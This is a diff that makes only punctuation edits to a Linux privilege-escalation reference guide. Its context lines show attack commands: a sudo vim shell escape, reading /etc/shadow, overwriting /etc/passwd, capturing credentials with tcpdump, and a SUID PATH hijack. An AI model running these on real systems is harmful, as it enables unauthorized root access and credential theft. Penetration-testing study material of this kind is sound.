@@ -1,6 +1,6 @@
 # Linux Privilege Escalation Techniques
 
-Core Linux privilege escalation vectors. Ordered by reliability and safety -- start from the top.
+Core Linux privilege escalation vectors. Ordered by reliability and safety - start from the top.
 
 ---
 
@@ -21,7 +21,7 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 
 Color key: RED/YELLOW = high-probability privesc vector. Focus on these first.
 
-### pspy -- Process Snooping Without Root
+### pspy - Process Snooping Without Root
 
 Monitors `/proc` for new processes. Catches cron jobs, scheduled tasks, and scripts run by
 other users that don't show up in `crontab`.
@@ -54,12 +54,12 @@ sudo -l
 
 ### GTFOBins Exploitation
 
-Reference: https://gtfobins.github.io -- search for any binary listed in `sudo -l`.
+Reference: https://gtfobins.github.io - search for any binary listed in `sudo -l`.
 
 Common examples:
 
 ```bash
-# vim -- -c runs an ex command on startup, bypassing interactive mode;
+# vim - -c runs an ex command on startup, bypassing interactive mode;
 # the :! prefix executes a shell command from within vim
 sudo vim -c ':!/bin/bash'
 
@@ -182,11 +182,11 @@ Cross-reference every binary against https://gtfobins.github.io/?#suid
 ### Common SUID Exploits
 
 ```bash
-# base64 -- read any file
+# base64 - read any file
 LFILE=/etc/shadow
 base64 "$LFILE" | base64 -d
 
-# cp -- overwrite /etc/passwd or /etc/shadow
+# cp - overwrite /etc/passwd or /etc/shadow
 # (prepare modified file first)
 cp /tmp/modified_passwd /etc/passwd
 
@@ -278,7 +278,7 @@ mount /dev/sda1 /tmp/hostfs
 ### Exploit cap_net_raw
 
 ```bash
-# Packet capture -- sniff credentials on the wire
+# Packet capture - sniff credentials on the wire
 tcpdump -i any -w /tmp/capture.pcap
 ```
 
@@ -372,7 +372,7 @@ gcc -static -m32 exploit.c -o exploit   # 32-bit
 ```
 
 **Note:** CVE-2024-1086 was added to CISA KEV and is actively exploited by ransomware groups.
-The io_uring "Curing" rootkit (ARMO, 2025) is not a CVE but a design blind spot -- io_uring
+The io_uring "Curing" rootkit (ARMO, 2025) is not a CVE but a design blind spot - io_uring
 ops bypass all syscall-monitoring tools (Falco, Defender). Mitigate with `sysctl io_uring_disabled=2`
 on systems that don't need io_uring.
 
@@ -409,7 +409,7 @@ export PATH=/tmp:$PATH
 echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
 chmod +x /tmp/service
 
-# Execute the SUID binary -- it calls our "service" instead
+# Execute the SUID binary - it calls our "service" instead
 /usr/local/bin/suid-binary
 ```
 
